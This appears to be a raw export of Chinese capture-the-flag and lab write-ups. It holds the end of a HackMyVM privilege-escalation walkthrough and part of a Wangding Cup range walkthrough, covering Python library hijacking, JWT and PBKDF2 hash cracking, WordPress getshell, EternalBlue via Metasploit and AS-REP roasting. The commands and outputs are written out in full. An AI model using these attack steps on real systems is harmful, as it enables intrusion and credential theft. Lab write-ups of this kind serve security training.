plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#vuln.py</span><br><span class=\"line\">import random</span><br><span class=\"line\">import time</span><br><span class=\"line\">import math</span><br><span class=\"line\">import string</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">def generate_random_string(length=10):</span><br><span class=\"line\"></span><br><span class=\"line\">    return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=length))</span><br><span class=\"line\"></span><br><span class=\"line\">def pointless_computation():</span><br><span class=\"line\"></span><br><span class=\"line\">    number = random.randint(1, 1000)</span><br><span class=\"line\">    result = math.sqrt(number) * math.log(number)</span><br><span class=\"line\">    print(f&quot;Calculated math nonsense: sqrt(&#123;number&#125;) * log(&#123;number&#125;) = &#123;result&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def simulate_time_wasting():</span><br><span class=\"line\"></span><br><span class=\"line\">    now = datetime.datetime.now()</span><br><span class=\"line\">    print(f&quot;Started wasting time at &#123;now&#125;&quot;)</span><br><span class=\"line\">    time.sleep(2)  # 故意睡眠 2 秒</span><br><span class=\"line\">    later = datetime.datetime.now()</span><br><span class=\"line\">    print(f&quot;Finished wasting time at &#123;later&#125;. Time wasted: &#123;later - now&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">def pointless_string_operations():</span><br><span class=\"line\"></span><br><span class=\"line\">    rand_str = generate_random_string()</span><br><span class=\"line\">    print(f&quot;Generated random string: &#123;rand_str&#125;&quot;)</span><br><span class=\"line\">    reversed_str = rand_str[::-1]</span><br><span class=\"line\">    print(f&quot;Reversed string: &#123;reversed_str&#125;&quot;)</span><br><span class=\"line\">    print(f&quot;String length: &#123;len(rand_str)&#125;&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    pointless_computation()</span><br><span class=\"line\">    simulate_time_wasting()</span><br><span class=\"line\">    pointless_string_operations()</span><br><span class=\"line\">    print(&quot;All done. The script accomplished nothing useful.&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>可以在/var/www/html目录下创建一个random.py文件进行劫持，python文件会优先加载当前目录下的库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#random.py</span><br><span class=\"line\">import os</span><br><span class=\"line\">os.system(&quot;bash -p&quot;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.py</span><br><span class=\"line\">debian@Newbee:/var/www/html$</span><br></pre></td></tr></table></figure>\n\n<p>提到debian用户了，home目录下有一个note.txt和一个config.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ cat note.txt</span><br><span class=\"line\">Damn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ cat config.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$servername = &quot;localhost&quot;;</span><br><span class=\"line\">$username = &quot;root&quot;;</span><br><span class=\"line\">$password = &quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$conn = new mysqli($servername, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">............</span><br><span class=\"line\">............</span><br></pre></td></tr></table></figure>\n\n<p>要拿到数据库的密码</p>\n<p>查看端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ ss -lntup</span><br><span class=\"line\">Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port Process</span><br><span class=\"line\">udp    UNCONN  0       0              0.0.0.0:68          0.0.0.0:*</span><br><span class=\"line\">tcp    LISTEN  0       128            0.0.0.0:22          0.0.0.0:*</span><br><span class=\"line\">tcp    LISTEN  0       80           127.0.0.1:3306        0.0.0.0:*</span><br><span class=\"line\">tcp    LISTEN  0       128          127.0.0.1:5000        0.0.0.0:*</span><br><span class=\"line\">tcp    LISTEN  0       128               [::]:22             [::]:*</span><br><span class=\"line\">tcp    LISTEN  0       511                  *:80                *:*</span><br></pre></td></tr></table></figure>\n\n<p>可以发现本地有5000端口，用socat将5000端口转发出去</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Newbee1.png\"></p>\n<p>是一个留言板，登录处除了admin，其他的都可以随意登录，cookie里有一个jwt，可以猜测是jwt伪造</p>\n<p>可以用hashcat爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\"></span><br><span class=\"line\">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class=\"line\">============================================================================================================================================</span><br><span class=\"line\">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class=\"line\"></span><br><span class=\"line\">Minimum password length supported by kernel: 0</span><br><span class=\"line\">Maximum password length supported by kernel: 256</span><br><span class=\"line\"></span><br><span class=\"line\">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class=\"line\">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class=\"line\">Rules: 1</span><br><span class=\"line\"></span><br><span class=\"line\">Optimizers applied:</span><br><span class=\"line\">* Zero-Byte</span><br><span class=\"line\">* Not-Iterated</span><br><span class=\"line\">* Single-Hash</span><br><span class=\"line\">* Single-Salt</span><br><span class=\"line\"></span><br><span class=\"line\">Watchdog: Temperature abort trigger set to 90c</span><br><span class=\"line\"></span><br><span class=\"line\">Host memory required for this attack: 2 MB</span><br><span class=\"line\"></span><br><span class=\"line\">Dictionary cache hit:</span><br><span class=\"line\">* Filename..: /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">* Passwords.: 14344385</span><br><span class=\"line\">* Bytes.....: 139921507</span><br><span class=\"line\">* Keyspace..: 14344385</span><br><span class=\"line\"></span><br><span class=\"line\">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noob</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 16500 (JWT (JSON Web Token))</span><br><span class=\"line\">Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4</span><br><span class=\"line\">Time.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)</span><br><span class=\"line\">Time.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)</span><br><span class=\"line\">Kernel.Feature...: Pure Kernel</span><br><span class=\"line\">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class=\"line\">Guess.Queue......: 1/1 (100.00%)</span><br><span class=\"line\">Speed.#1.........:  2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span><br><span class=\"line\">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class=\"line\">Progress.........: 5025792/14344385 (35.04%)</span><br><span class=\"line\">Rejected.........: 0/5025792 (0.00%)</span><br><span class=\"line\">Restore.Point....: 5021696/14344385 (35.01%)</span><br><span class=\"line\">Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span><br><span class=\"line\">Candidate.Engine.: Device Generator</span><br><span class=\"line\">Candidates.#1....: noobface888 -&gt; nona1807</span><br><span class=\"line\">Hardware.Mon.#1..: Util: 44%</span><br><span class=\"line\"></span><br><span class=\"line\">Started: Wed Mar 26 08:44:44 2025</span><br><span class=\"line\">Stopped: Wed Mar 26 08:44:49 2025</span><br></pre></td></tr></table></figure>\n\n<p>noob就是密钥，用户名伪造成admin，可以看到留言板的内容</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Newbee2.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreated</span><br><span class=\"line\">Welcome to the MariaDB monitor.  Commands end with ; or \\g.</span><br><span class=\"line\">Your MariaDB connection id is 5</span><br><span class=\"line\">Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12</span><br><span class=\"line\"></span><br><span class=\"line\">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class=\"line\"></span><br><span class=\"line\">No entry for terminal type &quot;unknown&quot;;</span><br><span class=\"line\">using dumb terminal settings.</span><br><span class=\"line\">No entry for terminal type &quot;unknown&quot;;</span><br><span class=\"line\">using dumb terminal settings.</span><br><span class=\"line\">Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.</span><br><span class=\"line\"></span><br><span class=\"line\">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure>\n\n<p>user库的user表里有debian的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Database changed</span><br><span class=\"line\">MariaDB [user]&gt; select * from user;</span><br><span class=\"line\">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class=\"line\">| id | username | passwd</span><br><span class=\"line\">                   | salt                             | passwd_hash_algo |</span><br><span class=\"line\">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class=\"line\">|  1 | debian   | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60   |</span><br><span class=\"line\">+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+</span><br><span class=\"line\">1 row in set (0.001 sec)</span><br></pre></td></tr></table></figure>\n\n<p>pbdf2爆破参考<a href=\"https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256\">https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# cat 2</span><br><span class=\"line\">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">hashcat (v6.2.6) starting in autodetect mode</span><br><span class=\"line\"></span><br><span class=\"line\">OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]</span><br><span class=\"line\">============================================================================================================================================</span><br><span class=\"line\">* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCU</span><br><span class=\"line\"></span><br><span class=\"line\">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class=\"line\">The following mode was auto-detected as the only one matching your input hash:</span><br><span class=\"line\"></span><br><span class=\"line\">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class=\"line\"></span><br><span class=\"line\">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class=\"line\">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class=\"line\"></span><br><span class=\"line\">Minimum password length supported by kernel: 0</span><br><span class=\"line\">Maximum password length supported by kernel: 256</span><br><span class=\"line\"></span><br><span class=\"line\">INFO: All hashes found as potfile and/or empty entries! Use --show to display them.</span><br><span class=\"line\"></span><br><span class=\"line\">Started: Wed Mar 26 08:49:58 2025</span><br><span class=\"line\">Stopped: Wed Mar 26 08:49:59 2025</span><br><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hashcat ./2 --show</span><br><span class=\"line\">Hash-mode was not specified with -m. Attempting to auto-detect hash mode.</span><br><span class=\"line\">The following mode was auto-detected as the only one matching your input hash:</span><br><span class=\"line\"></span><br><span class=\"line\">10900 | PBKDF2-HMAC-SHA256 | Generic KDF</span><br><span class=\"line\"></span><br><span class=\"line\">NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!</span><br><span class=\"line\">Do NOT report auto-detect issues unless you are certain of the hash type.</span><br><span class=\"line\"></span><br><span class=\"line\">sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx</span><br></pre></td></tr></table></figure>\n\n<p>用户home目录下还有一个.secret目录，里面有一个密码的压缩包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:~$ cd .secret/</span><br><span class=\"line\">debian@Newbee:~/.secret$ ls</span><br><span class=\"line\">hint.txt  password.zip</span><br><span class=\"line\">debian@Newbee:~/.secret$ cat hint.txt</span><br><span class=\"line\">password is md5(key)</span><br><span class=\"line\"></span><br><span class=\"line\">and key is in mysql!!!!!!</span><br></pre></td></tr></table></figure>\n\n<p>密码是1qaz2wsx的md5</p>\n<p>图片是马赛克，网上有一个项目是用来恢复马赛克的</p>\n<p><a href=\"https://github.com/spipm/Depixelization_poc\">https://github.com/spipm/Depixelization_poc</a></p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/Newbee3.png\"></p>\n<p>其实也不用跑，图片的原图就是这个项目的示例图片</p>\n<p>密码是<code>hellofromtheotherside</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">debian@Newbee:/tmp$ su - root</span><br><span class=\"line\">Password:</span><br><span class=\"line\">root@Newbee:~#</span><br></pre></td></tr></table></figure>\n\n","categories":["HackMyVM"],"tags":["靶机"]},{"title":"春秋云镜-2022网鼎杯半决赛复盘","url":"/2025/04/02/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98/","content":"<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# nmap 39.98.112.16 -p-</span><br><span class=\"line\">Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 02:06 EDT</span><br><span class=\"line\">Nmap scan report for 39.98.112.16</span><br><span class=\"line\">Host is up (0.00020s latency).</span><br><span class=\"line\">Not shown: 65533 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 135.21 seconds</span><br></pre></td></tr></table></figure>\n\n<p>只开了一个 22 端口和 80 端口</p>\n<p>访问 80 端口，很明显的 wordpress 框架</p>\n<p>用 wpscan 扫描可以扫描到一个 admin 用户，爆破密码可以爆破出来 admin 的密码是 123456</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[!] Valid Combinations Found:</span><br><span class=\"line\"> | Username: admin, Password: 123456</span><br></pre></td></tr></table></figure>\n\n<p>进入后台之后修改主题文件 getshell</p>\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%981.png\"></p>\n<p>访问/wp-content/themes/twentytwentyone/404.php，蚁剑连接</p>\n<p>flag01 在根目录</p>\n<p>查看网络信息，然后上传 fscan 进行内网扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(www-data:/tmp) $ ip a</span><br><span class=\"line\">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class=\"line\">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class=\"line\">    inet 127.0.0.1/8 scope host lo</span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">    inet6 :: 1/128 scope host </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br><span class=\"line\">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class=\"line\">    link/ether 00:16:3e: 2d: a8: bd brd ff: ff: ff: ff: ff: ff</span><br><span class=\"line\">    inet 172.22.15.26/16 brd 172.22.255.255 scope global dynamic eth0</span><br><span class=\"line\">       valid_lft 1892159075sec preferred_lft 1892159075sec</span><br><span class=\"line\">    inet6 fe80:: 216:3eff: fe2d: a8bd/64 scope link </span><br><span class=\"line\">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ./fscan -h 172.22.15.26/16 -time 10</span><br><span class=\"line\"> ___                              _</span><br><span class=\"line\">  / _ \\     _ __  __ _ _ __ __ _  _ __| | __</span><br><span class=\"line\"> / /_\\/____/ _ _|/ _ _| &#x27;_ _/ _` |/ __| |/ /</span><br><span class=\"line\">/ /_\\\\_ ____\\__ \\ (__| | | (_| | (__|   &lt;</span><br><span class=\"line\">\\____/     |___/\\___|_|  \\_ _,_|\\___|_|\\_\\</span><br><span class=\"line\">                     fscan version: 1.8.2</span><br><span class=\"line\">start infoscan</span><br><span class=\"line\">trying RunIcmp2</span><br><span class=\"line\">The current user permissions unable to send icmp packets</span><br><span class=\"line\">start ping</span><br><span class=\"line\">(icmp) Target 172.22.15.13    is alive</span><br><span class=\"line\">(icmp) Target 172.22.15.18    is alive</span><br><span class=\"line\">(icmp) Target 172.22.15.24    is alive</span><br><span class=\"line\">(icmp) Target 172.22.15.35    is alive</span><br><span class=\"line\">[*] Icmp alive hosts len is: 4</span><br><span class=\"line\">172.22.15.24:3306 open</span><br><span class=\"line\">172.22.15.35:445 open</span><br><span class=\"line\">172.22.15.13:445 open</span><br><span class=\"line\">172.22.15.18:445 open</span><br><span class=\"line\">172.22.15.35:139 open</span><br><span class=\"line\">172.22.15.24:139 open</span><br><span class=\"line\">172.22.15.18:139 open</span><br><span class=\"line\">172.22.15.13:139 open</span><br><span class=\"line\">172.22.15.35:135 open</span><br><span class=\"line\">172.22.15.24:135 open</span><br><span class=\"line\">172.22.15.13:135 open</span><br><span class=\"line\">172.22.15.18:135 open</span><br><span class=\"line\">172.22.15.24:80 open</span><br><span class=\"line\">172.22.15.18:80 open</span><br><span class=\"line\">172.22.15.24:445 open</span><br><span class=\"line\">172.22.15.13:88 open</span><br><span class=\"line\">[*] alive ports len is: 16</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]172.22.15.24</span><br><span class=\"line\">   [-&gt;] XR-WIN08</span><br><span class=\"line\">   [-&gt;] 172.22.15.24</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]172.22.15.35</span><br><span class=\"line\">   [-&gt;] XR-0687</span><br><span class=\"line\">   [-&gt;] 172.22.15.35</span><br><span class=\"line\">[*] NetBios: 172.22.15.35    XIAORANG\\XR-0687</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]172.22.15.18</span><br><span class=\"line\">   [-&gt;] XR-CA</span><br><span class=\"line\">   [-&gt;] 172.22.15.18</span><br><span class=\"line\">[*] NetInfo:</span><br><span class=\"line\">[*]172.22.15.13</span><br><span class=\"line\">   [-&gt;] XR-DC01</span><br><span class=\"line\">   [-&gt;] 172.22.15.13</span><br><span class=\"line\">[+] 172.22.15.24 MS17-010 (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)</span><br><span class=\"line\">[*] 172.22.15.13  (Windows Server 2016 Standard 14393)</span><br><span class=\"line\">[*] NetBios: 172.22.15.13    [+]DC XR-DC01.xiaorang.lab          Windows Server 2016 Standard 14393</span><br><span class=\"line\">[*] NetBios: 172.22.15.24    WORKGROUP\\XR-WIN08                  Windows Server 2008 R2 Enterprise 7601 Service Pack 1</span><br><span class=\"line\">[*] WebTitle: http://172.22.15.18       code: 200 len: 703    title: IIS Windows Server</span><br><span class=\"line\">[*] NetBios: 172.22.15.18    XR-CA.xiaorang.lab                  Windows Server 2016 Standard 14393</span><br><span class=\"line\">[*] WebTitle: http://172.22.15.24       code: 302 len: 0      title: None 跳转 url: http://172.22.15.24/www</span><br><span class=\"line\">[*] WebTitle: http://172.22.15.24/www/sys/index.php code: 200 len: 135    title: None</span><br><span class=\"line\">[+] http://172.22.15.18 poc-yaml-active-directory-certsrv-detect</span><br><span class=\"line\">已完成 16/16</span><br><span class=\"line\">[*] 扫描结束, 耗时: 23.238579924s</span><br></pre></td></tr></table></figure>\n\n<p>可以发现 172.22.15.24 存在 MS17-010 漏洞，直接上 msf，但是用 msf 梭哈之前需要先搭建一层代理，可以用 Venom 搭建很方便</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains msfconsole</span><br><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp</span><br><span class=\"line\">set rhosts 172.22.15.24</span><br><span class=\"line\">exploit</span><br></pre></td></tr></table></figure>\n\n<p>flag02 在 C:\\users\\administrator\\flag 里，添加一个新用户然后远程桌面连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">net user ll Asd123123 /add</span><br><span class=\"line\">net localgroup administrators ll /add</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://raw.githubusercontent.com/872323857/images/master/img/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%982.png\"></p>\n<p>可以看到数据库的密码，这个站点还存在一个 phpmyadmin，尝试登录 <code>root:root@#123</code>，将 zdoo 库里面的 user 表导出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#域内用户</span><br><span class=\"line\">lixiuying@xiaorang.lab</span><br><span class=\"line\">jiaxiaoliang@xiaorang.lab</span><br><span class=\"line\">wanglihong@xiaorang.lab</span><br><span class=\"line\">huachunmei@xiaorang.lab</span><br><span class=\"line\">zhangxinyu@xiaorang.lab</span><br><span class=\"line\">huzhigang@xiaorang.lab</span><br><span class=\"line\">lihongxia@xiaorang.lab</span><br><span class=\"line\">wangyulan@xiaorang.lab</span><br><span class=\"line\">chenjianhua@xiaorang.lab</span><br><span class=\"line\">zhangyi@xiaorang.lab</span><br><span class=\"line\">zhangli@xiaorang.lab</span><br><span class=\"line\">zhangwei@xiaorang.lab</span><br><span class=\"line\">liuqiang@xiaorang.lab</span><br><span class=\"line\">wangfang@xiaorang.lab</span><br><span class=\"line\">wangwei@xiaorang.lab</span><br><span class=\"line\">lixiaoliang@xiaorang.lab</span><br><span class=\"line\">wanghao@xiaorang.lab</span><br></pre></td></tr></table></figure>\n\n<p>将获得的账号放进 user.txt 里</p>\n<p>使用 AS-REP Roasting 攻击，尝试获取用户的密码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.15.13 -usersfile users.txt -format hashcat</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/share/doc/python3-impacket/examples/GetNPUsers.py: 165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class=\"line\">  now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)</span><br><span class=\"line\">$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:28dc48860e014c6d18a29bad65ba6cc8$ b6924f808e7a4d56bd403bc0e5286ad6b1cb1a39ee59331e484a90801fa82bbcb6b685236b61c5976a05330006b74f304fcfb56793de9c78d38caa16075bef947ad898c8b1130dad240a8298a98e86f18af90cebb015502c7758d6a32c366a42395d08877902d303ee0662540653b3c87c14d6d5319b63e5c5eaf6250d7e82d48d57afc56492344b618b054d6a75cf5ee014f00e92311479dba0ccb54c77b072213a42b79862f913a77a6b0fae4f9a67755ca83b583220c30b6f77296098c71bb42a2cbd8197bcd4e30598ecfbf519899b44cc5d723a4a49fc26db1a4b678a1afd4acea4b42b72949e677edd</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">$krb5asrep$ 23 $huachunmei@xiaorang.lab@XIAORANG.LAB:2fad79d14745c573303bd34c39f80e7f$ 0d9522fc4669f0e04b80e36cef3370c1cce5e232e2b131d6d652c7e2dad452a86918cfbd25e78a701896943ba6b50e241f27b8af4b5d79cffef11fd4ee2392325a468f8ff648e70a74e7d9d2ce58990dc91b36a5c84c2ffa7f45e7cdd852dc2a8df1e5e2f9491eb5c5753cdf54cac6cc2eed2a8b9b58c3693b058fcb6a6187ae49c4d80732aa40e0e3296313962128d414b85f75cb87af301ca39664fffc192e1b62755178c4c6b8f13dd70ff912c4f637a970f33bc367e84e4c1dcb31ade4a20b0bdf8bd7c64c19adf091f4850a8ea2c7a7428bbcb17ef7c87e02ae3b5f9637902612ba8fbe65b7599a7d7e</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] User lihongxia@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User wangyulan@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] User chenjianhua@xiaorang.lab doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br></pre></td></tr></table></figure>\n\n<p>返回了两个票据, 用 hashcat 爆破</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class=\"line\">└─# hashcat -m 18200 user.txt /usr/share/wordlists/rockyou.txt --show</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">$krb5asrep$ 23 $lixiuying@xiaorang.lab@XIAORANG.LAB:dbd1dee4c07eea9541a9f1af91b93180$ 